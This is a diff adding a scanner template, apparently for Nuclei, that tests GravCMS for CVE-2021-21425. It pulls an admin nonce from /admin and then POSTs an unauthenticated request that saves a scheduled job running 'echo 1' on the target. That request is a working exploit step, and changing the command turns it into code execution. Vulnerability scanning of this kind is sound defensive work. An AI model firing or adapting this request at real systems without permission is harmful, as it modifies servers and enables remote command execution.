@@ -1,0 +1,58 @@
+id: gravcms-scheduler-unauth-code-exec
+info:
+  name: GravCMS Scheduler API Unauthenticated Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    GravCMS allows unauthenticated users to execute some administrator controller methods in affected versions, potentially enabling YAML file creation or modification. Exploitation can lead to arbitrary configuration changes, command execution, or account hijacking.
+  tags: code-execution,gravcms
+  classification:
+    cve-id: CVE-2021-21425
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  reference:
+    - https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj
+    - https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/
+
+variables:
+  nonce_pattern: '"admin-nonce" value="(\w+)"'
+
+http:
+  - raw:
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "action=\"/"
+        part: body
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: nonce
+        regex:
+          - '{{nonce_pattern}}'
+        part: body
+        internal: true
+
+  - raw:
+      - |
+        POST /admin/config/scheduler HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: {{nonce}}
+
+        admin-nonce={{nonce}}&task=SaveDefault&data[custom_jobs][test_job][command]=echo&data[custom_jobs][test_job][args]=1&data[custom_jobs][test_job][at]=* * * * *&data[custom_jobs][test_job][output]=&data[status][test_job]=enabled&data[custom_jobs][test_job][output_mode]=overwrite
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Successfully saved"
+        part: body
+      - type: status
+        status:
+          - 200
